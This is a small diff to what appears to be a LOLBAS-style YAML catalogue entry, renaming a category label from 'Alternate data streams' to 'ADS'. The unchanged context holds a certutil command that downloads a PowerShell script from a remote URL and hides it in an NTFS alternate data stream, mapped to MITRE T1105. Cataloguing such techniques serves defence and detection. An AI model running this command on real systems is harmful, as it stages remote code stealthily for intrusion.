@@ -15,7 +15,7 @@ Commands:
   - Command: certutil.exe -urlcache -split -f https://raw.githubusercontent.com/Moriarty2016/git/master/test.ps1 c:\temp:ttt
     Description: Download and save a PS1 file to an Alternate Data Stream (ADS).
     Usecase: Download file from Internet and save it in an NTFS Alternate Data Stream
-    Category: Alternate data streams
+    Category: ADS
     Privileges: User
     MitreID: T1105
     MitreLink: https://attack.mitre.org/wiki/Technique/T1105
